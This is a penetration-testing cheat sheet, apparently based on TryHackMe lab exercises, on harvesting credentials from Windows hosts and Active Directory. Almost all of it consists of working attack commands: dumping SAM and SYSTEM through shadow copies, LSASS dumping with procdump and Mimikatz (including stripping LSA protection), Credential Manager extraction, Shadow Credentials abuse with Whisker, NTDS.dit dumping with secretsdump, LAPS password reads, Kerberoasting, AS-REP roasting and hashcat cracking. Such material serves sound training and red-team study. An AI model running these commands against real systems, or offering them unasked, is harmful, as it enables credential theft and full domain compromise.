# Credential Harvesting

* Accounts details (usernames and passwords)
* Hashes that include NTLM hashes, etc.
* Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
* Any information that helps login into a systemÃ‚ (private keys, etc.)

[https://github.com/SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)

[https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

[https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)

## Credential Access

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Clear-text files
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
# OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```
{% endcode %}

## Local Windows Credentials

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Keystrokes
# Security Account Manager (SAM)
# Metasploit's HashDump
meterpreter > hashdump

# Volume Shadow Copy Service -> with Administrator privileges
https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
C:\Users\Administrator>vssadmin list shadows
# The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
# Copy SYSTEM and SAM and transfer them to your attacking machine
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system

# Registry Hives
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```
{% endcode %}

## Local Security Authority Subsystem Service (LSASS)

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://attack.mitre.org/techniques/T1003/001/
# GUI -> in case it fails, we have to fix the registry value that protects LSASS
Task Manager > Details tab > lsass.exe > "Create dump file"

# Sysinternals Suite
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

# MimiKatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Protected LSASS
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
# If it shows this error, we can import mimdrv.sys driver to disable the LSA protection
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```
{% endcode %}

## Windows Credential Manager

{% code overflow="wrap" fullWidth="true" %}
```powershell
# List the current windows vaults
C:\Users\Administrator>vaultcmd /list
# Check if stored credentials -> if not, do not continue
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
# list more information about the stored credential
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
PS C:\Users\Administrator> Import-Module .\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

# RunAs
cmdkey /list
runas /savecred /user:THM.red\thm-local cmd.exe

# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```
{% endcode %}

## Shadow Credentials

<pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials
<strong>
</strong><strong>########## ENUMERATION WITH POWERVIEW
</strong>. .\PowerView.ps1
# Enumerate key user privileges for the user myuser
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "myuser" }  | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights 
# If we see a user has GenericWrite over a more privileged user, we could update msDS-KeyCredentialLink with a certificate

########## EXPLOITATION
.\Whisker.exe add /target:Administrator # Administrator or any other more privileged user we can "modify" with our current user
# It will give us the Rubeus command to use and we could use PTH for the hash we obtained from Rubeus
</code></pre>

## Domain Controller

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Local Dumping (No Credentials) -> needs Administrator/AD admin account on the domain
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local

# Remote Dumping (With Credentials)
secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.190.174
secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.190.174
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```
{% endcode %}

## Local Administrator Password Solution (LAPS)

{% code overflow="wrap" fullWidth="true" %}
```powershell
# Group Policy Preferences (GPP)
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

# Enumerate for LAPS -> find AdmPwd.dll file and find the user with privs to read LAPS
dir "C:\Program Files\LAPS\CSE"
PS> Get-Command *AdmPwd* #  available commands to use for AdmPwd cmdlets
# Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS
Find-AdmPwdExtendedRights -Identity * # then replace * with group names from the output and find one with exented rights to LAPS 
net groups "LAPS Reader" # example group from the command output above
net user "My user" # same, output from above

# Getting the Password -> find the specific machine / target computer which can get LAPS password
https://github.com/leoloobeek/LAPSToolkit
PS C:\> Get-AdmPwdPassword -ComputerName PC01
```
{% endcode %}

## Other attacks

{% code overflow="wrap" fullWidth="true" %}
```powershell
https://en.wikipedia.org/wiki/Kerberos_(protocol)

# Kerberoasting -> needs SPN account
GetUserSPNs.py -dc-ip 10.10.190.174 THM.red/thm # to find SPN user
GetUserSPNs.py -dc-ip 10.10.190.174 THM.red/thm -request-user svc-user # Requesting a TGS Ticket as SPN Account 
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roasting -> needs username list gathered previously
GetNPUsers.py -dc-ip 10.10.190.174 thm.red/ -usersfile /tmp/users.txt

# SMB Relay Attack
# LLMNR/NBNS Poisoning
```
{% endcode %}
